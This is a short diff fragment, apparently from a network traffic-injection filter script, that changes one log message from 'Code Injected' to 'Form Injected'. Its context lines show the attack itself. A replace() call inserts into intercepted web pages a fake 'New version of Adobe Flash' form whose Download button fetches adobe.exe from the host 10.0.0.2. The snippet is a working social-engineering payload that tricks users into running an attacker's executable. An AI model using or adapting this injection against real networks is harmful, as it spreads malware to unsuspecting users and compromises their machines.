@@ -17,7 +17,7 @@ replace("</title>", "</title> <form action='http://10.0.0.2/adobe.exe' method='l
 <img src='http://10.0.0.2/get.jpg'> </a><br> New version of Adobe Flash. Please install updates. <br><INPUT TYPE=submit value='Download!'></p>
 </form>");
 
-msg("Code Injected");
+msg("Form Injected");
 
   }
 
